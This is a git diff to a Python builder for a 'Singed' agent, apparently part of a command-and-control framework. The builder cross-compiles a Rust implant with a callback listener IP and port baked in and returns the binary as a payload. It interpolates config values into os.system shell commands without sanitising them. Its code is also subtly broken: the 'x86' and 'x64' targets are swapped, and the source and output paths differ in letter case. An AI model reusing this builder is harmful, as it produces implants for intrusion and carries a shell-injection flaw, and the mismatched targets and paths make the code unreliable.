@@ -212,20 +212,21 @@ class Singed(AgentType):
         self.builder_send_message( config[ 'ClientID' ], "Info", f"Options Config: {config['Options']}" )
         self.builder_send_message( config[ 'ClientID' ], "Info", f"Agent Config: {config['Config']}" )
 
-        # cross-compiling doesnt really work, need to review this
         build_string = f"SLEEP={config['Config']['Sleep']} IP={config['Options']['Listener']['HostBind']} PORT={config['Options']['Listener']['PortBind']} cargo build --release --manifest-path ../Singed/Cargo.toml --target="
+        data = b""
+
         match config['Options']['Arch']:
             case "ARM":
-                os.system(build_string + "aarch64-unknown-linux-gnu")
+                os.system("RUSTFLAGS='-C linker=aarch64-linux-gnu-gcc' " + build_string + "aarch64-unknown-linux-gnu")
+                data = open("../singed/target/aarch64-unknown-linux-gnu/release/singed", "rb").read()
             case "x86":
-                os.system(build_string + "x86_64-unknown-linux-gnu")
+                os.system("RUSTFLAGS='-C linker=x86_64-linux-gnu-gcc' " + build_string + "x86_64-unknown-linux-gnu")
+                data = open("../singed/target/x86_64-unknown-linux-gnu/release/singed", "rb").read()
             case "x64":
-                os.system(build_string + "i686-unknown-linux-gnu")
+                os.system("RUSTFLAGS='-C linker=i686-linux-gnu-gcc' " + build_string + "i686-unknown-linux-gnu")
+                data = open("../singed/target/i686-unknown-linux-gnu/release/singed", "rb").read()
             case _:
                 print("error: unknown architecture")
-
-        # open .exe
-        data = open("../Singed/target/release/singed", "rb").read()
 
         # build_send_payload. this function send back your generated payload
         self.builder_send_payload( config[ 'ClientID' ], self.Name + ".elf", data) # this is just an example.
